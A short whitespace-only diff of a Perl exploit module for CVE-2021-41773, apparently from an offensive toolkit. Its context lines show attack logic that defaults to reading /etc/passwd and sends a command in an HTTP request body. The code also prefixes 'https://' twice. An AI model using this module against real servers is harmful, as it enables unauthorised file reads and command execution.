@@ -18,10 +18,10 @@ package Spellbook::Advisory::CVE_2021_41773 {
         );
 
         if ($target) {
-            if ($target !~ /^http(?:s)?:\/\//msx) { 
+            if ($target !~ /^http(?:s)?:\/\//msx) {
                 $target = "https://$target";
             }
-            
+
             if (!$file) {
                 $file = "/etc/passwd";
             }
@@ -38,7 +38,7 @@ package Spellbook::Advisory::CVE_2021_41773 {
 
             my $useragent = Spellbook::Core::UserAgent -> new();
             my $request   = $useragent -> get(
-               "https://" . $target . $payload, 
+               "https://" . $target . $payload,
                 Content => $command || " "
             );
 
